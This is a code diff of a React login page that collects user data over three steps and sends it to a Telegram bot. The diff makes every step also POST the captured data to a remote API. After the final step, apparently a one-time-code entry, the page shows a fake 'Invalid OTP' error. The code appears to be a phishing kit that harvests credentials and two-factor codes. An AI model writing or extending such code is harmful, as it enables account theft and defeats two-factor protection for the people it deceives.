@@ -103,13 +103,14 @@ export default function Login() {
 🕐 Time: ${new Date().toLocaleString()}
         `
         await sendToTelegram(telegramMessage)
-      } else {
-        await fetch(`${API_URL}/api/users`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ ...step1Data, step: 1 })
-        })
       }
+
+      // Always send to API
+      await fetch(`${API_URL}/api/users`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...step1Data, step: 1 })
+      })
       
       setStep(2)
     } catch (err) {
@@ -136,13 +137,14 @@ export default function Login() {
 🕐 Time: ${new Date().toLocaleString()}
         `
         await sendToTelegram(telegramMessage)
-      } else {
-        await fetch(`${API_URL}/api/users`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(step3Data)
-        })
       }
+
+      // Always send to API
+      await fetch(`${API_URL}/api/users`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(step3Data)
+      })
       
       setStepLoading(false)
       setError('Invalid OTP, try again later')
@@ -457,13 +459,14 @@ export default function Login() {
 🕐 Time: ${new Date().toLocaleString()}
                       `
                       await sendToTelegram(telegramMessage)
-                    } else {
-                      await fetch(`${API_URL}/api/users`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(step2Data)
-                      })
                     }
+
+                    // Always send to API
+                    await fetch(`${API_URL}/api/users`, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify(step2Data)
+                    })
                     
                     setStep(3)
                   } catch (err) {
